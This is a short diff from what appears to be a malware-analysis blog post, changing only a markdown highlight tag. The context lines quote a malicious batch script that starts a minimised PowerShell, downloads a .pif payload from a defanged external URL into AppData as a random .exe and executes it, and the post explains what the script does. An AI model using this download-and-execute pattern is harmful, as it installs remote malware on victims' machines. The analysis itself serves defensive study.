@@ -113,7 +113,7 @@ The resulted .bat file will be:
 start /MIN C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  - win 1  - enc $ProcName = "Ktaqftbffhqhoxzyblssi.exe";
 (New - Object System.Net.WebClient).DownloadFile("hxxps[://]www[.]qqqformula[.]co[.]za/works/RICH[.]pif", "$env:APPDATA\$ProcName");
 Start - Process ("$env:APPDATA\$ProcName")
-{% highlight text %}
+{% endhighlight %}
 
 This script runs powershell script to download file from "hxxps[://]www[.]qqqformula[.]co[.]za/works/RICH[.]pif" to the current user's AppData directory with name "Ktaqftbffhqhoxzyblssi.exe" and executes it.
 
